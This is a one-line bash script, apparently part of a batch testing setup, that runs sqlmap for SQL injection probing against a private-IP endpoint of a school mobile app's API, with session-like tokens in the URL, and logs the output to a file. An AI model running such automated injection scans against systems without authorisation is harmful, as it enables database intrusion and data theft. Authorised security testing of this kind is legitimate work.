#!/bin/bash
python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u "https://172.16.56.180/whistlenew/index.php?m=authority&a=getAuthCustomGroupInfoLimit&platform=android&city_id=10&device_type=android&app_version=5.8.1.15037&group_id=386&offset=0&school=weishao&verify=102620%3Aweishao_android_5a0a93f40dd31_c81d4a5faa6b2f8c3abd0248c3521910&uid=0&identity=teacher&aid=102620&limit=18&package_name=com.ruijie.whistle" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/Client/Client_logfiles/78.log